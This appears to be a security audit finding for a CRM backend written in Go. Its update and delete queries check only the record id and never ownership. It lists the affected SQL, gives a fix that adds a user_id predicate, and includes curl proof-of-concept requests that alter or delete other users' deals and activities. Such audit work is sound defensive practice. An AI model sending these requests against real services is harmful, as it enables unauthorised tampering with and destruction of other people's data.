# CRIT-8/9/10: CRM Module — Zero Access Control on All Mutations

**Severity:** CRITICAL | **Exploitability:** 9/10 | **CVSS:** 9.1

## Locations
- `desktop/backend-go/internal/database/queries/crm.sql:226-238` (deals)
- `desktop/backend-go/internal/database/queries/crm.sql:131-178` (pipelines/stages)
- `desktop/backend-go/internal/database/queries/crm.sql:332-349` (activities)
- `desktop/backend-go/internal/database/queries/crm.sql:42` (companies)

## Description
Every CRM mutation query filters only on `id` with no `user_id` predicate:

```sql
UPDATE deals SET ... WHERE id = $1           -- no user_id
UPDATE pipelines SET ... WHERE id = $1       -- no user_id
UPDATE pipeline_stages SET ... WHERE id = $1 -- no user_id
DELETE FROM pipeline_stages WHERE id = $1    -- no user_id
UPDATE crm_activities SET ... WHERE id = $1  -- no user_id
DELETE FROM crm_activities WHERE id = $1     -- no user_id
UPDATE companies SET ... WHERE id = $1       -- no user_id
```

The handlers do NOT pre-validate ownership before calling these queries.

## PoC
```bash
# Any authenticated user modifies any deal on the platform
curl -X PUT /api/crm/deals/<victim_deal_uuid> \
  -H "Cookie: better-auth.session_token=<attacker_session>" \
  -d '{"amount": 0, "status": "lost"}'

# Mark any deal as won/lost
curl -X PATCH /api/crm/deals/<victim_deal_uuid>/status \
  -d '{"status": "lost"}'

# Delete any activity
curl -X DELETE /api/crm/activities/<victim_activity_uuid>
```

## Fix
Add `AND user_id = $N` to every mutation query and pass the authenticated user's ID:

```sql
-- name: UpdateCRMDeal :one
UPDATE deals SET name = $2, amount = $3, ...
WHERE id = $1 AND user_id = @user_id
RETURNING *;
```
